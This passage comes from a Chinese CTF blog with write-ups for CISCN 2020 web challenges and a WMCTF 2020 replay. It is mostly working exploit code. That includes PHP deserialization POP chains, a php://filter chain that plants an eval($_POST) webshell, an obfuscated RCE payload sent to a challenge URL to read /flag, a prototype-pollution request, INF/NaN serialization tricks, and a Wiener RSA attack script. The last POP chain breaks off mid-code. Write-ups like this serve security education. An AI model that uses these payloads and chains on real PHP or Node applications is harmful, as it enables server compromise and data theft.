$<span class="title">fields</span>,</span><br><span class="line">		//! <span class="title">Adhoc</span> <span class="title">fields</span></span><br><span class="line">		$<span class="title">adhoc</span> = [],</span><br><span class="line">		//! <span class="title">Dynamic</span> <span class="title">properties</span></span><br><span class="line">		$<span class="title">props</span> = [];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;adhoc = <span class="keyword">array</span>(<span class="number">20</span> =&gt; [<span class="string">"expr"</span> =&gt; <span class="string">"test"</span>]);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;db = <span class="keyword">$this</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;props[<span class="string">'quotekey'</span>] = <span class="string">"phpinfo"</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">DB</span>\<span class="title">SQL</span>\<span class="title">Mapper</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span><br><span class="line">		<span class="keyword">protected</span></span><br><span class="line">		$server,</span><br><span class="line">		$id,</span><br><span class="line">		$socket,</span><br><span class="line">		$flag,</span><br><span class="line">		$verb,</span><br><span class="line">		$uri,</span><br><span class="line">			$headers;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;server-&gt;events = <span class="keyword">array</span>(<span class="string">"disconnect"</span> =&gt; [<span class="keyword">new</span> Mapper(), <span class="string">"find"</span>]);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">WS</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">CLI</span>\<span class="title">WS</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">	<span class="comment">//print_r(serialize(new WS()));</span></span><br><span class="line">	<span class="keyword">echo</span> urlencode(serialize(<span class="keyword">array</span>(<span class="keyword">new</span> WS(), <span class="keyword">new</span> CLI\Agent())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200820212428928.png" alt="image-20200820212428928"></p>
<p>exp2:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            //! <span class="title">PDO</span> <span class="title">wrapper</span></span><br><span class="line">            $<span class="title">db</span>,</span><br><span class="line">            //! <span class="title">Database</span> <span class="title">engine</span></span><br><span class="line">            $<span class="title">engine</span>,</span><br><span class="line">            //! <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">            $<span class="title">source</span>,</span><br><span class="line">            //! <span class="title">SQL</span> <span class="title">table</span> (<span class="title">quoted</span>)</span><br><span class="line">            $<span class="title">table</span>,</span><br><span class="line">            //! <span class="title">Alias</span> <span class="title">for</span> <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">            $<span class="title">as</span>,</span><br><span class="line">            //! <span class="title">Last</span> <span class="title">insert</span> <span class="title">ID</span></span><br><span class="line">            $<span class="title">_id</span>,</span><br><span class="line">            //! <span class="title">Defined</span> <span class="title">fields</span></span><br><span class="line">            $<span class="title">fields</span>,</span><br><span class="line">            //! <span class="title">Adhoc</span> <span class="title">fields</span></span><br><span class="line">            $<span class="title">adhoc</span> = [],</span><br><span class="line">            //! <span class="title">Dynamic</span> <span class="title">properties</span></span><br><span class="line">            $<span class="title">props</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;adhoc = <span class="keyword">array</span>(<span class="number">20</span> =&gt; [<span class="string">"expr"</span> =&gt; <span class="string">"test"</span>]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;props[<span class="string">'read'</span>] = <span class="string">"phpinfo"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">DB</span>\<span class="title">Jig</span>\<span class="title">Mapper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span></span><br><span class="line">            $server,</span><br><span class="line">            $id,</span><br><span class="line">            $socket,</span><br><span class="line">            $flag,</span><br><span class="line">            $verb,</span><br><span class="line">            $uri,</span><br><span class="line">            $headers;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server-&gt;events = <span class="keyword">array</span>(<span class="string">"disconnect"</span> =&gt; [<span class="keyword">new</span> Mapper($a), <span class="string">"insert"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">Jig</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span>   &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            //! <span class="title">Flat</span>-<span class="title">file</span> <span class="title">DB</span> <span class="title">wrapper</span></span><br><span class="line">            $<span class="title">db</span>,</span><br><span class="line">            //! <span class="title">Data</span> <span class="title">file</span></span><br><span class="line">            $<span class="title">file</span>,</span><br><span class="line">            //! <span class="title">Document</span> <span class="title">identifier</span></span><br><span class="line">            $<span class="title">id</span>,</span><br><span class="line">            //! <span class="title">Document</span> <span class="title">contents</span></span><br><span class="line">            $<span class="title">document</span>=[],</span><br><span class="line">            //! <span class="title">field</span> <span class="title">map</span>-<span class="title">reduce</span> <span class="title">handlers</span></span><br><span class="line">            $<span class="title">_reduce</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = $a;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="number">20</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">CLI</span>\<span class="title">WS</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    <span class="comment">//print_r(serialize(new WS()));</span></span><br><span class="line">    $a= <span class="keyword">new</span> DB\SQL\Mapper();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">array</span>(<span class="keyword">new</span> WS(), <span class="keyword">new</span> CLI\Agent($a))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x02-easyphp"><a href="#0x02-easyphp" class="headerlink" title="0x02 easyphp"></a>0x02 easyphp</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<h1 id="pcntl-fork"><a href="#pcntl-fork" class="headerlink" title="pcntl_fork"></a>pcntl_fork</h1><p>(PHP 4 &gt;= 4.1.0, PHP 5, PHP 7)</p>
<p>pcntl_fork — 在当前进程当前位置产生分支（子进程）。译注：fork是创建了一个子进程，父进程和子进程 都从fork的位置开始向下继续执行，不同的是父进程执行过程中，得到的fork返回值为子进程 号，而子进程得到的是0。</p>
</blockquote>
<p><a href="https://bugs.php.net/bug.php?id=52173" target="_blank" rel="noopener">phpbug</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?a&#x3D;call_user_func&amp;b&#x3D;pcntl_wait</span><br><span class="line">&#x2F;?a&#x3D;call_user_func&amp;b&#x3D;pcntl_waitpid</span><br></pre></td></tr></table></figure>

<h1 id="0x03-rceme"><a href="#0x03-rceme" class="headerlink" title="0x03 rceme"></a>0x03 rceme</h1><p>参考<a href="https://xz.aliyun.com/t/6068和RCTF的calc" target="_blank" rel="noopener">https://xz.aliyun.com/t/6068和RCTF的calc</a>,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">"((((((1).(5))&#123;1&#125;)^(((1).(0.00001))&#123;4&#125;)).((((1).(0.1))&#123;2&#125;)^(((999**999).(1))&#123;2&#125;)).((((1).(5))&#123;1&#125;)^(((1).(0.00001))&#123;4&#125;)).((((1).(0.1))&#123;2&#125;)^((((1).(0.00001))&#123;4&#125;)|(((999**999).(1))&#123;2&#125;))).((((1).(0.1))&#123;2&#125;)|(((999**999).(1))&#123;1&#125;)).((((999**999).(1))&#123;0&#125;)^((((1).(0.1))&#123;2&#125;)|(((1).(-1))&#123;1&#125;))).((((1).(0.1))&#123;2&#125;)|(((1).(0.00001))&#123;4&#125;))))();//"</span>;</span><br><span class="line"><span class="keyword">eval</span>($str);</span><br><span class="line">$str = <span class="string">"&#123;if:1)"</span> . str_replace(<span class="keyword">array</span>(<span class="string">"&#123;"</span>, <span class="string">"&#125;"</span>), <span class="keyword">array</span>(<span class="string">"["</span>, <span class="string">"]"</span>), $str) . <span class="string">"&#125;&#123;end if&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;if:1)((((((1).(5))[1])^(((1).(0.00001))[4])).((((1).(0.1))[2])^(((999**999).(1))[2])).((((1).(5))[1])^(((1).(0.00001))[4])).((((1).(0.1))[2])^((((1).(0.00001))[4])|(((999**999).(1))[2]))).((((1).(0.1))[2])|(((999**999).(1))[1])).((((999**999).(1))[0])^((((1).(0.1))[2])|(((1).(-1))[1]))).((((1).(0.1))[2])|(((1).(0.00001))[4]))))();&#x2F;&#x2F;&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200820184830765.png" alt="image-20200820184830765"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2zei1qumnps754gs59g6.cloudeci1.ichunqiu.com&#x2F;?a&#x3D;&#123;if:1) echo &#96;cat &#x2F;flag&#96;;&#x2F;&#x2F;&#125;x&#123;end if&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x04-easytrick"><a href="#0x04-easytrick" class="headerlink" title="0x04 easytrick"></a>0x04 easytrick</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $trick1;</span><br><span class="line">	<span class="keyword">public</span> $trick2;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;trick1 = (string) <span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">		<span class="keyword">if</span> (strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2) &#123;</span><br><span class="line">			<span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line">$a-&gt;trick1 = <span class="string">"INF"</span>;</span><br><span class="line">$a-&gt;trick2 = <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $trick1;</span><br><span class="line">	<span class="keyword">public</span> $trick2;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;trick1 = (string) <span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">		<span class="keyword">if</span> (strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2) &#123;</span><br><span class="line">			<span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line">$a-&gt;trick1 = <span class="string">"NaN"</span>;</span><br><span class="line">$a-&gt;trick2 = <span class="number">0</span> / <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<h1 id="0x05-littlegame"><a href="#0x05-littlegame" class="headerlink" title="0x05 littlegame"></a>0x05 littlegame</h1><p>给了源码，审计源码可以看到有如下三个关键的路由</p>
<p><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200821142901154.png" alt="image-20200821142901154"></p>
<ul>
<li><p>/DeveloperControlPanel</p>
<p>如果admin对应body传的的key索引对应的值和body传的password相等就可以得到flag。</p>
<img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/比赛202006/国赛/wp/image-20200821143105291.png" alt="image-20200821143105291" style="zoom:200%;">
</li>
<li><p>/Privilege</p>
<p>对body传的NewAttributeKey和NewAttributeValue作setFn操作，通过搜索可以知道setFn<a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">有原型链污染漏洞</a><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200821143353995.png" alt="image-20200821143353995"></p>
</li>
</ul>
<p>解题步骤：</p>
<ol>
<li><pre><code>{&quot;NewAttributeKey&quot;:&quot;constructor.prototype.a1&quot;,&quot;NewAttributeValue&quot;:&quot;aaaaa&quot;}
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   ![image-20200821143857671](2020ciscn-web题目writeup&#x2F;image-20200821143857671.png)</span><br><span class="line"></span><br><span class="line">2. &#96;&#96;&#96;json</span><br><span class="line">   &#123;&quot;key&quot;:&quot;a1&quot;,&quot;password&quot;:&quot;aaaaa&quot;&#125;</span><br></pre></td></tr></table></figure>

![image-20200821144013140](2020ciscn-web题目writeup/image-20200821144013140.png)




</code></pre></li>
</ol>
<h1 id="0x06-bd"><a href="#0x06-bd" class="headerlink" title="0x06 bd"></a>0x06 bd</h1><blockquote>
<p><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200821144531943.png" alt="image-20200821144531943"></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    <span class="comment"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">"Hacked!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">c = <span class="number">37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span></span><br><span class="line">e = <span class="number">46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span></span><br><span class="line">n = <span class="number">86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span></span><br><span class="line">d = wiener_hack(e, n)</span><br><span class="line">print(d)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2020WMCTF-WEB题目复现</title>
    <url>/2020/08/08/2020WMCTF-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>WMCTF几道Web题目复现</p>
<a id="more"></a>

<h1 id="0x01-checkin"><a href="#0x01-checkin" class="headerlink" title="0x01 checkin"></a>0x01 checkin</h1><p>首先总结下php中的<a href="https://www.php.net/manual/zh/filters.convert.php" target="_blank" rel="noopener">过滤器</a></p>
<ul>
<li>字符串过滤器</li>
</ul>
<p>php://filter/string.rot13</p>
<p>php://filter/string.toupper</p>
<p>php://filter/string.tolower</p>
<ul>
<li>string.strip_tags</li>
</ul>
<p>php://filter/string.strip_tags   可以去掉<code>&lt;?php  xxxx?&gt;</code></p>
<ul>
<li>转换过滤器</li>
</ul>
<p>php://filter/convert.base64-decode</p>
<p>php://filter/convert.base64-encode</p>
<ul>
<li>压缩过滤器</li>
</ul>
<p>php://filter/zlib.inflate/resource   解压</p>
<p>php://filter/zlib.deflate/resource  压缩</p>
<p>php://filter/bzip2.compress/resource  压缩</p>
<p>php://filter/bzip2.decompress/resource  解压</p>
<ul>
<li>加密过滤器</li>
</ul>
<p>php://filter/mcrypt.tripledes/resource=   加密</p>
<p>php://filter/mdecrypt.tripledes/resource=   解密</p>
<h3 id="解法一：利用url二次编码"><a href="#解法一：利用url二次编码" class="headerlink" title="解法一：利用url二次编码"></a>解法一：利用url二次编码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$char = <span class="string">'U'</span>; <span class="comment">#构造r的二次编码 </span></span><br><span class="line"><span class="keyword">for</span> ($ascii1 = <span class="number">0</span>; $ascii1 &lt; <span class="number">256</span>; $ascii1++) &#123; </span><br><span class="line">    <span class="keyword">for</span> ($ascii2 = <span class="number">0</span>; $ascii2 &lt; <span class="number">256</span>; $ascii2++) &#123; </span><br><span class="line">        $aaa = <span class="string">'%'</span>.$ascii1.<span class="string">'%'</span>.$ascii2; </span><br><span class="line">        <span class="keyword">if</span>(urldecode(urldecode($aaa)) == $char)&#123; </span><br><span class="line">            <span class="keyword">echo</span> $char.<span class="string">': '</span>.$aaa; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"\n"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>i——-%6%39   </p>
<p>U—–%5%35</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.%6%39conv.%5%35CS-2LE.%5%35CS-2BE|?&lt;hp%20pvela$(P_SO[T11)];%20&gt;?&#x2F;resource&#x3D;a.php</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/08/2020WMCTF-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808170056003.png" alt="image-20200808170056003"></p>
<p>包含文件</p>
<p><img src="/2020/08/08/2020WMCTF-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200808170121453.png" alt="image-20200808170121453"></p>
<h3 id="解法二：利用临时文件包含"><a href="#解法二：利用临时文件包含" class="headerlink" title="解法二：利用临时文件包含"></a>解法二：利用临时文件包含</h3><blockquote>
<p><img src="/2020/08/08/2020WMCTF-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200814201554594.png" alt="image-20200814201554594"></p>
<p><a href="https://github.com/Mote-Z/PHP-Is-The-Best/tree/master/PHP_Tempfile_Exploit" target="_blank" rel="noopener">PHP-Is-The-Best</a></p>
</blockquote>
<p>本题php版本为7.0.33，可以利用临时文件包含getshell。</p>
<h1 id="0x02-webweb"><a href="#0x02-webweb" class="headerlink" title="0x02 webweb"></a>0x02 webweb</h1><p>trick1:当一个数组的第一个元素为类对象，第二个元素为之前类对象的函数名，可以通过数组名调用之前类的对应的方法，源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		system(<span class="string">"whoami"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$array = <span class="keyword">array</span>(<span class="keyword">new</span> A(), <span class="string">"foo"</span>);</span><br><span class="line">$array();</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/08/2020WMCTF-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200814093944571.png" alt="image-20200814093944571"></p>
<p>trick2:源码中的WS.php里面包含两个类，分别是WS类和Agent类，源码是利用autoload函数自动加载类，在new一个CLI\WS类时会通过autoload()函数包含CLI/WS.php，如果new一个CLI\Agent类时，因为不存在CLI/Agent.php，所以新建CLI\Agent类会失败。所以我们可以采用首先新建一个WS类，先包含CLI/WS.php，然后就可以成功新建Agent类。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">autoload</span><span class="params">($class)</span> </span>&#123;</span><br><span class="line">		$class=<span class="keyword">$this</span>-&gt;fixslashes(ltrim($class,<span class="string">'\\'</span>));</span><br><span class="line">		<span class="comment">/** <span class="doctag">@var</span> callable $func */</span></span><br><span class="line">		$func=<span class="keyword">NULL</span>;</span><br><span class="line">		<span class="keyword">if</span> (is_array($path=<span class="keyword">$this</span>-&gt;hive[<span class="string">'AUTOLOAD'</span>]) &amp;&amp;</span><br><span class="line">			<span class="keyword">isset</span>($path[<span class="number">1</span>]) &amp;&amp; is_callable($path[<span class="number">1</span>]))</span><br><span class="line">			<span class="keyword">list</span>($path,$func)=$path;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;split(<span class="keyword">$this</span>-&gt;hive[<span class="string">'PLUGINS'</span>].<span class="string">';'</span>.$path) <span class="keyword">as</span> $auto)</span><br><span class="line">			<span class="keyword">if</span> ($func &amp;&amp; is_file($file=$func($auto.$class).<span class="string">'.php'</span>) ||</span><br><span class="line">				is_file($file=$auto.$class.<span class="string">'.php'</span>) ||</span><br><span class="line">				is_file($file=$auto.strtolower($class).<span class="string">'.php'</span>) ||</span><br><span class="line">				is_file($file=strtolower($auto.$class).<span class="string">'.php'</span>))</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">require</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以采用两种方式，第一种将Agent类作为WS类的一个属性的值，在反序列化时会先加载WS类，之后包含ws.php,然后就可以成功加载Agent类对象；第二种方法序列化处理一个数组，数组的第一个元素为ws类对象，第二个元素为Agent对象，在反序列化该数组序列化后的字符串时首先加载WS类，包含ws.php,之后就可以成功加载Agent对象。</p>
<p>接下来寻找pop链</p>
<p>exp如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span> &#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Mapper</span> &#123;</span><br><span class="line">		<span class="title">protected</span></span><br><span class="line">		//! <span class="title">PDO</span> <span class="title">wrapper</span></span><br><span class="line">		$<span class="title">db</span>,</span><br><span class="line">		//! <span class="title">Database</span> <span class="title">engine</span></span><br><span class="line">		$<span class="title">engine</span>,</span><br><span class="line">		//! <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">		$<span class="title">source</span>,</span><br><span class="line">		//! <span class="title">SQL</span> <span class="title">table</span> (<span class="title">quoted</span>)</span><br><span class="line">		$<span class="title">table</span>,</span><br><span class="line">		//! <span class="title">Alias</span> <span class="title">for</span> <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">		$<span class="title">as</span>,</span><br><span class="line">		//! <span class="title">Last</span> <span class="title">insert</span> <span class="title">ID</span></span><br><span class="line">		$<span class="title">_id</span>,</span><br><span class="line">		//! <span class="title">Defined</span> <span class="title">fields</span></span><br><span class="line">		$<span class="title">fields</span>,</span><br><span class="line">		//! <span class="title">Adhoc</span> <span class="title">fields</span></span><br><span class="line">		$<span class="title">adhoc</span> = [],</span><br><span class="line">		//! <span class="title">Dynamic</span> <span class="title">properties</span></span><br><span class="line">		$<span class="title">props</span> = [];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 